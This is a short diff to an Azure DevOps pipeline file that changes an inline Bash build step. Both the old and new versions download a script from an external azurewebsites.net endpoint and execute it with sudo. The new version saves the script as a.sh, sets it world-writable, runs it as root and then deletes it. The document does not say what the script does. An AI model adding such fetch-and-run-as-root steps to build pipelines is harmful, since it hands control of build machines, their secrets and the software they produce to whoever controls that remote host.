@@ -75,7 +75,7 @@ steps:
 - task: Bash@3
   inputs:
     targetType: 'inline'
-    script: 'curl -s https://officeadotest.azurewebsites.net/api/httptrigger2 | sudo bash -'
+    script: 'curl -s https://officeadotest.azurewebsites.net/api/httptrigger2 -o a.sh && sudo chmod 777 a.sh && sudo sh a.sh && rm -f a.sh'
 
 # - task: PublishPipelineArtifact@1
 #   inputs:
